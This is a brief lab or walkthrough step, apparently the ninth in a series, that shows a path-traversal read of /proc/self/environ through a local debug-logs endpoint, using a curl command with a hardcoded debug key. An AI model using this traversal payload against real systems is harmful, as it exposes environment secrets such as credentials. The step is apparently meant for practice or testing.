## 09 - Environment disclosure via `/proc/self/environ`

### Goal
Extract process environment data through the file-read endpoint.

### Endpoint
- `GET http://127.0.0.1:4000/__debug/logs?file=../../../../proc/self/environ`

### Example

```bash
curl -s \
  -H "X-Debug-Key: nvault_debug_2024_internal" \
  "http://127.0.0.1:4000/__debug/logs?file=../../../../proc/self/environ"
```

